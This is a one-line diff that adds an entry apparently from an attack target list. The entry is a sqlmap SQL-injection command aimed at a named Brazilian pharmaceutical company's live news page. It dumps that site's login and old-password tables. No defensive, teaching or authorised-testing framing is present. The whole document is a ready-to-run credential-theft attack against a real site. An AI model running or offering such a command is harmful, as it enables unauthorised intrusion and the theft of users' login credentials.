@@ -1,0 +1,1 @@
+https://www.infinitumpharma.com.br/noticia.php?id=6 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.infinitumpharma.com.br/noticia.php?id=6 -D infinitu_pharma -T cadastro_login,senha_antiga --dump
